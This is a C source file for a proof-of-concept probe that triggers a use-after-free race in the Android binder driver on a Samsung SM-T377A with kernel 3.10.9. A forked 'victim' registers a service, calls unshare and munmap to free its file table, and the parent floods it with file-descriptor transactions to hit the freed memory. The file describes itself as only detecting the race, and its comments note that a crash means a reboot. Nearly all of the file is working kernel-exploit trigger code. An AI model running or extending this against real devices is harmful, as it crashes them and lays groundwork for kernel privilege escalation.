/* binder_files_race_v2.c — Proper binder proc->files UAF probe
 *
 * ARCHITECTURE:
 *   Victim  (server child):  opens binder, mmaps, registers as "bfr_test" service
 *                             with ServiceManager, does unshare(CLONE_FILES)+munmap to
 *                             schedule BINDER_DEFERRED_PUT_FILES, then enters binder looper.
 *   Sender  (parent):        waits for victim ready signal, gets "bfr_test" handle via
 *                             getService, sends BINDER_TYPE_FD transactions rapidly.
 *
 * RACE WINDOW:
 *   Victim's old files_struct has refcount=1 (only binder holds it) after unshare.
 *   munmap -> binder_vma_close -> BINDER_DEFERRED_PUT_FILES queued.
 *   Deferred worker: proc->files=NULL; put_files_struct(old_files). <-- FREE
 *   Sender: task_get_unused_fd_flags(target_proc,...) reads proc->files.  <-- UAF
 *
 * SAFETY:
 *   Child runs with alarm(30). panic_on_oops=1 on SM-T377A means a crash = reboot.
 *   Start with low iteration count and delays; escalate only if device survives.
 *   The probe only DETECTS the race by observing whether FD installs behave anomalously.
 *
 * BUILD:  qemu\build-arm.bat src\binder\binder_files_race_v2.c binder_files_race_v2
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>

/* ---- Linux binder kernel ABI (matches 3.10.9) ---- */
struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_version { int32_t protocol_version; };

struct binder_transaction_data {
    union { uint32_t handle; void *ptr; } target;
    void *cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    uint32_t data_size;
    uint32_t offsets_size;
    union {
        struct { const void *buffer; const void *offsets; } ptr;
        uint8_t buf[8];
    } data;
};

struct flat_binder_object {
    uint32_t type;
    uint32_t flags;
    union { uintptr_t binder; uint32_t handle; };
    uintptr_t cookie;
};

struct binder_ptr_cookie { void *ptr; void *cookie; };
struct binder_pri_ptr_cookie { int32_t priority; void *ptr; void *cookie; };

#define BINDER_WRITE_READ   _IOWR('b', 1, struct binder_write_read)
#define BINDER_VERSION      _IOWR('b', 9, struct binder_version)
#define BINDER_MMAP_SIZE    (1024 * 1024)
#define BINDER_DEV          "/dev/binder"

/* BC_ commands */
#define BC_TRANSACTION          _IOW('c', 0, struct binder_transaction_data)
#define BC_REPLY                _IOW('c', 1, struct binder_transaction_data)
#define BC_FREE_BUFFER          _IOW('c', 3, void *)
#define BC_ENTER_LOOPER         0x000d0000  /* literal byte stream value */
#define BC_EXIT_LOOPER          0x000e0000

/* BR_ replies */
#define BR_TRANSACTION      _IOR('r', 2, struct binder_transaction_data)
#define BR_REPLY            _IOR('r', 3, struct binder_transaction_data)
#define BR_DEAD_REPLY       _IO('r', 5)
#define BR_TRANSACTION_COMPLETE _IO('r', 6)
#define BR_INCREFS          _IOR('r', 7, struct binder_ptr_cookie)
#define BR_ACQUIRE          _IOR('r', 8, struct binder_ptr_cookie)
#define BR_RELEASE          _IOR('r', 9, struct binder_ptr_cookie)
#define BR_DECREFS          _IOR('r', 10, struct binder_ptr_cookie)
#define BR_ATTEMPT_ACQUIRE  _IOR('r', 11, struct binder_pri_ptr_cookie)
#define BR_NOOP             _IO('r', 12)
#define BR_SPAWN_LOOPER     _IO('r', 13)
#define BR_DEAD_BINDER      _IOR('r', 15, void *)
#define BR_CLEAR_DEATH_NOTIFICATION_DONE _IOR('r', 16, void *)
#define BR_FAILED_REPLY     _IO('r', 17)

/* flat_binder_object types */
#define BINDER_TYPE_BINDER  0x73624a85
#define BINDER_TYPE_HANDLE  0x73682a85
#define BINDER_TYPE_FD      0x66642a85

/* ServiceManager codes */
#define SM_GET_SERVICE  1
#define SM_ADD_SERVICE  3

/* Transaction flags */
#define TF_ONE_WAY      0x01
#define TF_ACCEPT_FDS   0x10

/* unshare CLONE_FILES (guard against sched.h duplicate) */
#ifndef CLONE_FILES
#define CLONE_FILES     0x400
#endif

/* ---- Parcel helpers ---- */
static void write_u32(uint8_t **p, uint32_t v) {
    memcpy(*p, &v, 4); *p += 4;
}
static void write_string16(uint8_t **p, const char *s) {
    uint32_t len = strlen(s);
    write_u32(p, len);
    for (uint32_t i = 0; i < len; i++) {
        uint16_t c = (uint8_t)s[i];
        memcpy(*p, &c, 2); *p += 2;
    }
    /* null terminator */
    uint16_t nul = 0; memcpy(*p, &nul, 2); *p += 2;
    /* align to 4 bytes */
    while ((uintptr_t)*p % 4) (*p)++;
}
static void write_interface_token(uint8_t **p, const char *iface) {
    write_u32(p, 0); /* strict mode policy */
    write_string16(p, iface);
}

/* ---- Low-level binder I/O ---- */
static int binder_do_write_read(int fd, void *wbuf, size_t wsz,
                                 void *rbuf, size_t rsz,
                                 size_t *rconsumed) {
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_buffer = (uintptr_t)wbuf;
    bwr.write_size   = wsz;
    bwr.read_buffer  = (uintptr_t)rbuf;
    bwr.read_size    = rsz;
    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (rconsumed) *rconsumed = bwr.read_consumed;
    return ret;
}


/* Send a transaction and optionally return a BR_REPLY handle (-1 if none) */
static int32_t send_transaction_get_handle(int fd, uint32_t target_handle,
                                            uint32_t code, uint32_t flags,
                                            uint8_t *tdata, size_t tlen,
                                            uint8_t *offdata, size_t offlen) {
    struct {
        uint32_t cmd;
        struct binder_transaction_data td;
    } __attribute__((packed)) wb;
    memset(&wb, 0, sizeof(wb));
    wb.cmd = BC_TRANSACTION;
    wb.td.target.handle = target_handle;
    wb.td.code   = code;
    wb.td.flags  = flags;
    wb.td.data.ptr.buffer  = tdata;
    wb.td.data.ptr.offsets = offdata;
    wb.td.data_size    = tlen;
    wb.td.offsets_size = offlen;

    uint8_t rbuf[1024];
    size_t rc = 0;
    int ret = binder_do_write_read(fd, &wb, sizeof(wb), rbuf, sizeof(rbuf), &rc);
    if (ret < 0) return -1;

    /* Parse response */
    for (int iter = 0; iter < 30; iter++) {
        uint8_t *p = rbuf, *end = rbuf + rc;
        while (p + 4 <= end) {
            uint32_t cmd = *(uint32_t*)p; p += 4;
            if (cmd == BR_NOOP || cmd == BR_TRANSACTION_COMPLETE || cmd == BR_SPAWN_LOOPER) continue;
            if (cmd == BR_INCREFS || cmd == BR_ACQUIRE || cmd == BR_RELEASE || cmd == BR_DECREFS)
                { p += sizeof(struct binder_ptr_cookie); continue; }
            if (cmd == BR_DEAD_BINDER || cmd == BR_CLEAR_DEATH_NOTIFICATION_DONE)
                { p += sizeof(void*); continue; }
            if (cmd == BR_ATTEMPT_ACQUIRE)
                { p += sizeof(struct binder_pri_ptr_cookie); continue; }
            if (cmd == BR_DEAD_REPLY || cmd == BR_FAILED_REPLY) return -2;
            if (cmd == BR_REPLY) {
                struct binder_transaction_data *td = (struct binder_transaction_data*)p;
                p += sizeof(*td);
                if (td->offsets_size >= 4) {
                    uint32_t *offs = (uint32_t*)(uintptr_t)td->data.ptr.offsets;
                    uint8_t  *dp   = (uint8_t*)(uintptr_t)td->data.ptr.buffer;
                    int noff = td->offsets_size / 4;
                    for (int i = 0; i < noff; i++) {
                        struct flat_binder_object *obj =
                            (struct flat_binder_object*)(dp + offs[i]);
                        if (obj->type == BINDER_TYPE_HANDLE)
                            return (int32_t)obj->handle;
                    }
                }
                /* Free the reply buffer */
                uint8_t freebuf[8];
                uint8_t *fp = freebuf;
                uint32_t fbc = BC_FREE_BUFFER;
                write_u32(&fp, fbc);
                uintptr_t buf_ptr = (uintptr_t)td->data.ptr.buffer;
                memcpy(fp, &buf_ptr, sizeof(uintptr_t));
                fp += sizeof(uintptr_t);
                binder_do_write_read(fd, freebuf, fp - freebuf, NULL, 0, NULL);
                return 0; /* reply received but no handle */
            }
            break;
        }
        /* need more data */
        rc = 0;
        binder_do_write_read(fd, NULL, 0, rbuf, sizeof(rbuf), &rc);
    }
    return -3;
}

/* ---- addService(name, binder_ptr) ---- */
static int binder_add_service(int fd, const char *name, uintptr_t binder_node) {
    uint8_t tdata[512];
    uint8_t offdata[16];
    uint8_t *p = tdata;

    write_interface_token(&p, "android.os.IServiceManager");
    write_string16(&p, name);

    /* flat_binder_object: type=BINDER_TYPE_BINDER */
    uint32_t obj_offset = p - tdata;
    struct flat_binder_object fbo;
    memset(&fbo, 0, sizeof(fbo));
    fbo.type   = BINDER_TYPE_BINDER;
    fbo.flags  = 0x10; /* TF_ACCEPT_FDS not relevant here; flags=0x10 for priority */
    fbo.binder = binder_node;
    fbo.cookie = 0;
    memcpy(p, &fbo, sizeof(fbo)); p += sizeof(fbo);

    /* allow_isolated = 0 (int32) */
    write_u32(&p, 0);

    uint32_t *offp = (uint32_t*)offdata;
    *offp = obj_offset;

    int32_t ret = send_transaction_get_handle(fd, 0 /*SM*/, SM_ADD_SERVICE, 0,
                                               tdata, p - tdata,
                                               offdata, 4);
    return (ret >= 0) ? 0 : (int)ret;
}

/* ---- getService(name) -> handle ---- */
static int32_t binder_get_service(int fd, const char *name) {
    uint8_t tdata[256];
    uint8_t *p = tdata;
    write_interface_token(&p, "android.os.IServiceManager");
    write_string16(&p, name);
    return send_transaction_get_handle(fd, 0, SM_GET_SERVICE, 0,
                                        tdata, p - tdata, NULL, 0);
}

/* ---- Send BINDER_TYPE_FD transaction to a handle ---- */
static int send_fd_to_handle(int fd, uint32_t handle, int pipe_rd) {
    uint8_t tdata[128];
    uint8_t offdata[8];
    uint8_t *p = tdata;

    /* minimal parcel: just the flat_binder_object */
    uint32_t obj_offset = p - tdata;
    struct flat_binder_object fbo;
    memset(&fbo, 0, sizeof(fbo));
    fbo.type   = BINDER_TYPE_FD;
    fbo.flags  = 0x7f | TF_ACCEPT_FDS;
    fbo.handle = (uint32_t)pipe_rd;
    fbo.cookie = 0;
    memcpy(p, &fbo, sizeof(fbo)); p += sizeof(fbo);

    uint32_t *offp = (uint32_t*)offdata;
    *offp = obj_offset;

    struct {
        uint32_t cmd;
        struct binder_transaction_data td;
    } __attribute__((packed)) wb;
    memset(&wb, 0, sizeof(wb));
    wb.cmd = BC_TRANSACTION;
    wb.td.target.handle = handle;
    wb.td.code   = 1;
    wb.td.flags  = TF_ONE_WAY; /* async — don't wait for reply */
    wb.td.data.ptr.buffer  = tdata;
    wb.td.data.ptr.offsets = offdata;
    wb.td.data_size    = p - tdata;
    wb.td.offsets_size = 4;

    uint8_t rbuf[256];
    size_t rc = 0;
    int ret = binder_do_write_read(fd, &wb, sizeof(wb), rbuf, sizeof(rbuf), &rc);
    /* Drain TC */
    if (rc > 0) {
        uint8_t *rp = rbuf, *rend = rbuf + rc;
        while (rp + 4 <= rend) {
            uint32_t cmd = *(uint32_t*)rp; rp += 4;
            if (cmd == BR_TRANSACTION_COMPLETE) break;
            if (cmd == BR_NOOP || cmd == BR_SPAWN_LOOPER) continue;
            if (cmd == BR_INCREFS || cmd == BR_ACQUIRE || cmd == BR_RELEASE || cmd == BR_DECREFS)
                rp += sizeof(struct binder_ptr_cookie);
            else break;
        }
    }
    return ret;
}

/* ---- Victim server (runs in child) ---- */
static void run_victim(int ready_pipe_wr, int fd_count_pipe_rd) {
    printf("[victim] starting\n");
    fflush(stdout);

    int bfd = open(BINDER_DEV, O_RDWR | O_CLOEXEC);
    if (bfd < 0) { printf("[victim] open binder failed: %d\n", errno); _exit(1); }

    void *bmap = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    if (bmap == MAP_FAILED) { printf("[victim] mmap failed: %d\n", errno); _exit(1); }

    /* Get binder version */
    struct binder_version ver;
    ioctl(bfd, BINDER_VERSION, &ver);
    printf("[victim] binder version: %d\n", (int)ver.protocol_version);

    /* Enter looper before registering */
    {
        /* BC_ENTER_LOOPER = _IO('c', 12) in Android kernel binder.h */
        uint32_t enter_looper_cmd = _IO('c', 12);
        uint8_t wb[4];
        memcpy(wb, &enter_looper_cmd, 4);
        binder_do_write_read(bfd, wb, 4, NULL, 0, NULL);
        printf("[victim] BC_ENTER_LOOPER sent (0x%x)\n", enter_looper_cmd);
    }

    /* Register our binder node as "bfr_test" service */
    /* binder_node value: any stable userspace address */
    uintptr_t my_node = (uintptr_t)&run_victim;
    int ret = binder_add_service(bfd, "bfr_test", my_node);
    printf("[victim] addService('bfr_test') = %d\n", ret);
    fflush(stdout);

    /* Signal parent: ready */
    uint8_t sig = 1;
    (void)write(ready_pipe_wr, &sig, 1);
    close(ready_pipe_wr);

    /* ---- KEY STEPS: unshare + munmap ---- */
    /* Count current FDs before unshare */
    int fds_before = 0;
    {
        DIR *d = opendir("/proc/self/fd");
        if (d) {
            struct dirent *de;
            while ((de = readdir(d)) != NULL) fds_before++;
            closedir(d);
        }
    }
    printf("[victim] FDs before unshare: ~%d\n", fds_before);

    /* unshare(CLONE_FILES): creates new files_struct for this task.
     * Binder still holds old files_struct (refcount=1). */
    long uret = syscall(__NR_unshare, CLONE_FILES);
    printf("[victim] unshare(CLONE_FILES) = %ld (errno=%d)\n", uret, (uret<0)?errno:0);
    fflush(stdout);

    /* munmap: triggers binder_vma_close -> BINDER_DEFERRED_PUT_FILES
     * Now old files_struct will be freed asynchronously by binder worker. */
    if (munmap(bmap, BINDER_MMAP_SIZE) < 0)
        printf("[victim] munmap failed: %d\n", errno);
    else
        printf("[victim] munmap done — BINDER_DEFERRED_PUT_FILES queued\n");
    fflush(stdout);

    /* Enter binder looper to process incoming FD transactions.
     * task_fd_install() will try to use proc->files (our freed old files_struct). */
    printf("[victim] entering binder looper...\n");
    fflush(stdout);

    uint8_t rbuf[2048];
    int loops = 0;
    while (loops < 5000) {
        size_t rc = 0;
        binder_do_write_read(bfd, NULL, 0, rbuf, sizeof(rbuf), &rc);
        if (rc == 0) { usleep(1000); loops++; continue; }

        uint8_t *p = rbuf, *end = rbuf + rc;
        while (p + 4 <= end) {
            uint32_t cmd = *(uint32_t*)p; p += 4;
            if (cmd == BR_NOOP || cmd == BR_SPAWN_LOOPER) continue;
            if (cmd == BR_TRANSACTION_COMPLETE) continue;
            if (cmd == BR_INCREFS || cmd == BR_ACQUIRE || cmd == BR_RELEASE || cmd == BR_DECREFS)
                { p += sizeof(struct binder_ptr_cookie); continue; }
            if (cmd == BR_DEAD_BINDER || cmd == BR_CLEAR_DEATH_NOTIFICATION_DONE)
                { p += sizeof(void*); continue; }
            if (cmd == BR_ATTEMPT_ACQUIRE)
                { p += sizeof(struct binder_pri_ptr_cookie); continue; }
            if (cmd == BR_TRANSACTION) {
                struct binder_transaction_data *td = (struct binder_transaction_data*)p;
                p += sizeof(*td);
                loops++;
                if (loops % 100 == 0)
                    printf("[victim] processed %d transactions\n", loops);
                /* Free buffer */
                uint8_t fb[4 + sizeof(uintptr_t)];
                uint8_t *fp = fb;
                uint32_t fbc = BC_FREE_BUFFER;
                write_u32(&fp, fbc);
                uintptr_t bptr = (uintptr_t)td->data.ptr.buffer;
                memcpy(fp, &bptr, sizeof(uintptr_t)); fp += sizeof(uintptr_t);
                binder_do_write_read(bfd, fb, fp - fb, NULL, 0, NULL);
                continue;
            }
            /* Unknown cmd */
            if (loops % 500 == 0)
                printf("[victim] unknown BR cmd: 0x%x\n", cmd);
            p = end;
        }
        loops++;
    }

    printf("[victim] looper done after %d iters\n", loops);
    _exit(0);
}

/* ---- Sender (parent) ---- */
static void run_sender(int ready_pipe_rd, pid_t victim_pid) {
    printf("[sender] waiting for victim ready signal...\n");
    fflush(stdout);

    uint8_t sig = 0;
    if (read(ready_pipe_rd, &sig, 1) != 1 || sig != 1) {
        printf("[sender] ready signal failed\n");
        return;
    }
    close(ready_pipe_rd);
    printf("[sender] victim ready. Opening binder...\n");
    fflush(stdout);

    /* Small delay to let victim do unshare+munmap */
    usleep(100000); /* 100ms */

    int bfd = open(BINDER_DEV, O_RDWR | O_CLOEXEC);
    if (bfd < 0) { printf("[sender] open binder failed: %d\n", errno); return; }

    void *bmap = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    if (bmap == MAP_FAILED) { printf("[sender] mmap failed: %d\n", errno); close(bfd); return; }

    /* Lookup victim's service handle */
    int32_t handle = -1;
    for (int try = 0; try < 10; try++) {
        handle = binder_get_service(bfd, "bfr_test");
        if (handle > 0) break;
        printf("[sender] getService try %d: handle=%d\n", try, handle);
        usleep(200000);
    }
    printf("[sender] getService('bfr_test') = %d\n", handle);
    fflush(stdout);

    if (handle <= 0) {
        printf("[sender] failed to get victim handle — cannot race\n");
        goto done;
    }

    /* Create a pipe to use as the FD to send */
    int pipe_fds[2];
    if (pipe(pipe_fds) < 0) { printf("[sender] pipe: %d\n", errno); goto done; }

    printf("[sender] starting BINDER_TYPE_FD race (handle=%d)...\n", handle);
    fflush(stdout);

    /* Race: rapidly send BINDER_TYPE_FD to victim's handle.
     * Some iterations will hit the race window where proc->files is freed. */
    int successes = 0, errors = 0;
    for (int i = 0; i < 2000; i++) {
        int ret = send_fd_to_handle(bfd, (uint32_t)handle, pipe_fds[0]);
        if (ret == 0) successes++;
        else errors++;

        if (i % 200 == 0) {
            printf("[sender] iter %d: ok=%d err=%d\n", i, successes, errors);
            fflush(stdout);
        }
        usleep(500); /* 0.5ms between sends — conservative */
    }

    printf("[sender] race complete: successes=%d errors=%d\n", successes, errors);
    printf("[sender] If device alive: race window too narrow or gracefully handled\n");
    printf("[sender] If crash/reboot occurred: race triggered (panic_on_oops)\n");

    close(pipe_fds[0]);
    close(pipe_fds[1]);

done:
    munmap(bmap, BINDER_MMAP_SIZE);
    close(bfd);
}

int main(void) {
    printf("=== Binder proc->files UAF Race Probe v2 ===\n");
    printf("target: SM-T377A kernel 3.10.9, panic_on_oops=1\n\n");
    fflush(stdout);

    int ready_pipe[2];
    if (pipe(ready_pipe) < 0) { perror("pipe"); return 1; }

    /* Fork victim into child, sender stays in parent */
    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return 1; }

    if (pid == 0) {
        /* CHILD = victim server */
        close(ready_pipe[0]); /* close read end */
        alarm(30);            /* safety: exit after 30s */
        run_victim(ready_pipe[1], -1);
        _exit(0);
    }

    /* PARENT = sender */
    close(ready_pipe[1]); /* close write end */
    run_sender(ready_pipe[0], pid);

    /* Collect child */
    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status))
        printf("[main] victim exited: %d\n", WEXITSTATUS(status));
    else if (WIFSIGNALED(status))
        printf("[main] victim killed by signal: %d\n", WTERMSIG(status));
    else
        printf("[main] victim status: 0x%x\n", status);

    printf("\n=== Probe complete ===\n");
    return 0;
}
